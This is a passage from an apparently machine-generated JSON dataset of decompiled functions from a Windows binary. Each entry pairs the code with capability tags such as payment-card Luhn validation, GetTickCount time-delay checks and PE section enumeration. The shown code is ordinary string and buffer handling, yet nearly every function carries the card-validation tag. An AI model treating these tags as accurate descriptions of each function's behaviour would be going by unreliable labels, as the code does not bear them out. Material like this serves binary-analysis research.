        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00405350(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint32_t arg_ch_00;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar2 = fcn.00404960();\n    fcn.00406270(arg_8h);\n    iVar1 = *(iVar2 + 0x10);\n    if (*(iVar2 + 0x14) - iVar1 < arg_10h) {\n        in_ECX = fcn.00408340(arg_10h, 0, arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        *(iVar2 + 0x10) = iVar1 + arg_10h;\n        iVar2 = fcn.004062c0();\n        arg_ch_00 = iVar2 + arg_8h;\n        if ((arg_ch_00 < arg_ch + arg_10h) && (arg_ch <= iVar2 + iVar1)) {\n            if (arg_ch < arg_ch_00) {\n                var_ch = arg_ch_00 - arg_ch;\n            }\n            else {\n                var_ch = 0;\n            }\n        }\n        else {\n            var_ch = arg_10h;\n        }\n        fcn.004013d0(arg_ch_00 + arg_10h, arg_ch_00, (iVar1 - arg_8h) + 1);\n        fcn.00401380(arg_ch_00, arg_ch, var_ch);\n        fcn.00401380(arg_ch_00 + var_ch, arg_ch + arg_10h + var_ch, arg_10h - var_ch);\n    }\n    return in_ECX;\n}\n",
        "token_count": 446
    },
    "00405470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00405470(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint var_4h;\n    \n    fcn.00401380(arg_8h, arg_ch, arg_14h);\n    fcn.00401380(arg_8h + arg_14h, arg_18h, arg_1ch);\n    fcn.00401380(arg_8h + arg_14h + arg_1ch, arg_ch + arg_14h, (arg_10h - arg_14h) + 1);\n    return;\n}\n",
        "token_count": 159
    },
    "00405580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040559e)\n\nint32_t __cdecl fcn.00405580(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401440(arg_8h);\n    if (in_ECX != iVar1) {\n        uVar2 = fcn.00404960();\n        fcn.00406320(uVar2);\n        iVar1 = fcn.00404960();\n        uVar2 = *(iVar1 + 0x10);\n        arg_8h_00 = fcn.004062c0();\n        fcn.00406d10(arg_8h_00, uVar2);\n    }\n    return in_ECX;\n}\n",
        "token_count": 198
    },
    "00405640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405640(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00401440(arg_8h);\n    if (in_ECX != iVar2) {\n        fcn.00406810(uVar1);\n        uVar3 = fcn.00404960();\n        fcn.004061b0(uVar3);\n        uVar3 = fcn.00401440(arg_8h);\n        fcn.004071a0(uVar3);\n    }\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 248
    },
    "004056d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004056d0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    uVar2 = fcn.00401440(uVar2);\n    fcn.00408270(uVar2);\n    uVar2 = fcn.00401440(arg_8h);\n    fcn.00407100(uVar2);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 215
    },
    "00405810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405810(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uchar var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470428;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00404960(uVar1);\n    arg_8h_00 = fcn.00401440(&var_dh);\n    fcn.00408270(arg_8h_00);\n    var_4h = 0;\n    fcn.00406fe0(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 223
    },
    "00405c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c40(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(in_ECX + 0x40) = 0;\n    *(in_ECX + 0x44) = 0;\n    *(in_ECX + 4) = arg_8h;\n    arg_8h_00 = fcn.00408490(in_ECX + 8, *(in_ECX + 4));\n    fcn.00401a10(arg_8h_00);\n    fcn.00401990();\n    *(in_ECX + 0x4c) = 0;\n    return;\n}\n",
        "token_count": 186
    },
    "00405fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __fastcall fcn.00405fb0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00404960(param_1);\n    return iVar1 + 8;\n}\n",
        "token_count": 73
    },
    "004061b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061b0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00404960();\n    fcn.00408520(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 73
    },
    "00406320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406320(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00404960();\n    fcn.00408560(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 72
    },
    "00406350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406350(void)\n\n{\n    uint arg_8h;\n    char cVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    uint uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    fcn.00406300();\n    arg_8h_00 = fcn.00404960();\n    cVar1 = fcn.004073a0();\n    if (cVar1 != '\\0') {\n        arg_8h = *arg_8h_00;\n        uVar2 = fcn.00404960();\n        uVar3 = fcn.00401440(arg_8h_00);\n        fcn.00408580(uVar2, uVar3);\n        fcn.00407710(arg_8h, arg_8h_00[5] + 1);\n    }\n    arg_8h_00[4] = 0;\n    arg_8h_00[5] = 7;\n    var_2h._0_2_ = 0;\n    fcn.00407220(arg_8h_00, &var_2h);\n    return;\n}\n",
        "token_count": 305
    },
    "00406400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00406400(uint param_1)\n\n{\n    int32_t arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    arg_8h = fcn.00404960(param_1);\n    *(arg_8h + 0x10) = 0;\n    *(arg_8h + 0x14) = 7;\n    var_2h._0_2_ = 0;\n    fcn.00407220(arg_8h, &var_2h);\n    return;\n}\n",
        "token_count": 169
    },
    "00406450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406450(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *arg_ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    iVar1 = fcn.00404960();\n    var_2h._0_2_ = 0;\n    *(iVar1 + 0x10) = arg_8h;\n    arg_ch = &var_2h;\n    iVar1 = fcn.00406170();\n    fcn.00407220(iVar1 + arg_8h * 2, arg_ch);\n    return;\n}\n",
        "token_count": 166
    },
    "004064c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004064c0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00407260(arg_8h);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.004064f0(arg_8h, uVar1);\n    return;\n}\n",
        "token_count": 84
    },
    "004064f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004064f0(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    ushort var_4h;\n    uint var_1h;\n    \n    iVar1 = fcn.00404960();\n    if (arg_ch < *(iVar1 + 0x14) || arg_ch == *(iVar1 + 0x14)) {\n        arg_8h_00 = fcn.00406170();\n        *(iVar1 + 0x10) = arg_ch;\n        fcn.00407750(arg_8h_00, arg_8h, arg_ch);\n        var_4h = 0;\n        fcn.00407220(arg_8h_00 + arg_ch * 2, &var_4h);\n    }\n    else {\n        var_1h._0_1_ = 0;\n        in_ECX = fcn.00408590(arg_ch, 0, arg_8h);\n    }\n    return in_ECX;\n}\n",
        "token_count": 284
    },
    "00406580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406580(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_2h;\n    \n    fcn.00407240(arg_8h, arg_10h, arg_ch);\n    var_2h._0_2_ = 0;\n    fcn.00407220(arg_8h + arg_ch * 2, &var_2h);\n    return;\n}\n",
        "token_count": 134
    },
    "004065c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004065c0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    ushort var_4h;\n    uint var_1h;\n    \n    iVar2 = fcn.00404960();\n    iVar1 = *(iVar2 + 0x10);\n    if (*(iVar2 + 0x14) - iVar1 < arg_8h) {\n        var_1h._0_1_ = 0;\n        in_ECX = fcn.00408690(arg_8h, 0, arg_8h, arg_ch & 0xffff);\n    }\n    else {\n        *(iVar2 + 0x10) = iVar1 + arg_8h;\n        iVar2 = fcn.00406170();\n        fcn.00407730(iVar2 + iVar1 * 2, arg_8h, arg_ch & 0xffff);\n        var_4h = 0;\n        fcn.00407220(iVar2 + (iVar1 + arg_8h) * 2, &var_4h);\n    }\n    return in_ECX;\n}\n",
        "token_count": 315
    },
    "00406670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406670(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint var_8h;\n    uint var_2h;\n    \n    fcn.00407240(arg_8h, arg_ch, arg_10h);\n    fcn.00407730(arg_8h + arg_10h * 2, arg_14h, arg_18h & 0xffff);\n    var_2h._0_2_ = 0;\n    fcn.00407220(arg_8h + (arg_10h + arg_14h) * 2, &var_2h);\n    return;\n}\n",
        "token_count": 193
    },
    "004066d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066d0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470160;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = fcn.00404960(uVar1);\n    arg_8h_01 = fcn.00404960();\n    puVar2 = fcn.00401440(arg_8h_01);\n    puVar3 = fcn.00401440(arg_8h_00);\n    *puVar2 = *puVar3;\n    puVar2[1] = puVar3[1];\n    puVar2[2] = puVar3[2];\n    puVar2[3] = puVar3[3];\n    puVar2[4] = puVar3[4];\n    puVar2[5] = puVar3[5];\n    fcn.00406400();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 343
    },
    "00406770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00406770(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.004066d0(arg_8h_00);\n    return;\n}\n",
        "token_count": 95
    },
    "004069e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid fcn.004069e0(void)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar1 = fcn.00404960();\n    var_8h = fcn.00407430(uVar1);\n    var_10h = 0x10;\n    piVar2 = fcn.00406a60(&var_8h, &var_10h);\n    var_14h = *piVar2;\n    var_18h = var_14h + -1;\n    var_1ch = fcn.004012f0();\n    fcn.00407940(&var_1ch, &var_18h);\n    fcn.0043a2e7(var_1ch);\n    return;\n}\n",
        "token_count": 256
    },
    "00406c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00406c70(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint var_4h;\n    \n    fcn.00401380(arg_8h, arg_ch, arg_14h);\n    fcn.00401380(arg_8h + arg_14h, arg_1ch, arg_20h);\n    fcn.00401380(arg_8h + arg_14h + arg_20h, arg_ch + arg_14h + arg_18h, ((arg_10h - arg_18h) - arg_14h) + 1);\n    return;\n}\n",
        "token_count": 181
    },
    "00406da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406da0(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00401380(arg_8h, arg_10h, arg_ch);\n    var_1h._0_1_ = 0;\n    fcn.00401410(arg_8h + arg_ch, &var_1h);\n    return;\n}\n",
        "token_count": 132
    },
    "00406e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406e80(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00401380(arg_8h, arg_ch, arg_10h);\n    fcn.004013f0(arg_8h + arg_10h, arg_14h, arg_18h & 0xff);\n    var_1h._0_1_ = 0;\n    fcn.00401410(arg_10h + arg_14h + arg_8h, &var_1h);\n    return;\n}\n",
        "token_count": 187
    },
    "00406f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406f80(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00401380(arg_8h, arg_ch, arg_10h);\n    fcn.00401380(arg_8h + arg_10h, arg_14h, arg_18h);\n    var_1h._0_1_ = 0;\n    fcn.00401410(arg_10h + arg_18h + arg_8h, &var_1h);\n    return;\n}\n",
        "token_count": 180
    },
    "00406fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406fe0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    uint arg_8h_00;\n    uint *arg_10h_00;\n    int32_t arg_8h_01;\n    uint32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_ch = fcn.00404960();\n    var_18h = fcn.00404960();\n    var_10h = *(var_18h + 0x10);\n    var_20h = fcn.004062c0();\n    if (var_10h < 0x10) {\n        arg_8h_01 = 0x10;\n        fcn.00401380(var_ch, var_20h, 0x10);\n        *(var_ch + 0x10) = var_10h;\n        *(var_ch + 0x14) = 0xf;\n    }\n    else {\n        var_1ch = fcn.00404960();\n        var_28h = fcn.004069e0();\n        var_2ch = var_10h | 0xf;\n        piVar1 = fcn.00407940(&var_2ch, &var_28h);\n        var_24h = *piVar1;\n        arg_8h_01 = var_24h + 1;\n        var_8h = fcn.004071d0(arg_8h_01);\n        arg_10h_00 = &var_8h;\n        uVar2 = fcn.00401440(var_ch);\n        fcn.00408ce0(var_1ch, uVar2, arg_10h_00);\n        arg_10h = var_10h + 1;\n        uVar2 = var_20h;\n        arg_8h_00 = fcn.00401440(var_8h);\n        fcn.00401380(arg_8h_00, uVar2, arg_10h);\n        *(var_ch + 0x10) = var_10h;\n        *(var_ch + 0x14) = var_24h;\n    }\n    fcn.0043a2e7(arg_8h_01);\n    return;\n}\n",
        "token_count": 602
    },
    "00407100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407100(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470160;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = fcn.00404960(uVar1);\n    arg_8h_01 = fcn.00404960();\n    puVar2 = fcn.00401440(arg_8h_01);\n    puVar3 = fcn.00401440(arg_8h_00);\n    *puVar2 = *puVar3;\n    puVar2[1] = puVar3[1];\n    puVar2[2] = puVar3[2];\n    puVar2[3] = puVar3[3];\n    puVar2[4] = puVar3[4];\n    puVar2[5] = puVar3[5];\n    fcn.004068c0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 343
    },
    "004071a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004071a0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00407100(arg_8h_00);\n    return;\n}\n",
        "token_count": 95
    },
    "004071d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004071d0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00408d10(arg_8h_00);\n    return;\n}\n",
        "token_count": 73
    },
    "00407240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407240(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00401270(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 51
    },
    "00407320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407320(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    uint var_4h;\n    \n    arg_10h = fcn.00404960();\n    fcn.00408d80(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 74
    },
    "00407380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407380(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00408d50(arg_8h, arg_ch * 0x18);\n    return;\n}\n",
        "token_count": 56
    },
    "00407440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407440(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    uVar2 = fcn.00401440(uVar2);\n    uVar3 = fcn.00406170();\n    uVar3 = fcn.00401440(uVar3);\n    fcn.004073d0(uVar3, uVar2);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 227
    },
    "00407510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407510(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    ushort var_4h;\n    uint var_1h;\n    \n    iVar2 = fcn.00404960();\n    iVar1 = *(iVar2 + 0x10);\n    if (*(iVar2 + 0x14) - iVar1 < arg_ch) {\n        var_1h._0_1_ = 0;\n        in_ECX = fcn.00408db0(arg_ch, 0, arg_8h, arg_ch);\n    }\n    else {\n        *(iVar2 + 0x10) = iVar1 + arg_ch;\n        iVar2 = fcn.00406170();\n        fcn.00407750(iVar2 + iVar1 * 2, arg_8h, arg_ch);\n        var_4h = 0;\n        fcn.00407220(iVar2 + (iVar1 + arg_ch) * 2, &var_4h);\n    }\n    return in_ECX;\n}\n",
        "token_count": 297
    },
    "004075c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004075c0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint var_8h;\n    uint var_2h;\n    \n    fcn.00407240(arg_8h, arg_ch, arg_10h);\n    fcn.00407240(arg_8h + arg_10h * 2, arg_14h, arg_18h);\n    var_2h._0_2_ = 0;\n    fcn.00407220(arg_8h + (arg_10h + arg_18h) * 2, &var_2h);\n    return;\n}\n",
        "token_count": 188
    },
    "00407620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407620(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uchar var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470428;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00404960(uVar1);\n    arg_8h_00 = fcn.00401440(&var_dh);\n    fcn.00408270(arg_8h_00);\n    var_4h = 0;\n    fcn.00407770(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 222
    },
    "004076a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004076a0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    uVar2 = fcn.00401440(uVar2);\n    uVar3 = fcn.004062c0();\n    uVar3 = fcn.00401440(uVar3);\n    fcn.004073d0(uVar3, uVar2);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 229
    },
    "00407750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407750(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00401290(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 51
    },
    "00407770": {
        "rules": [
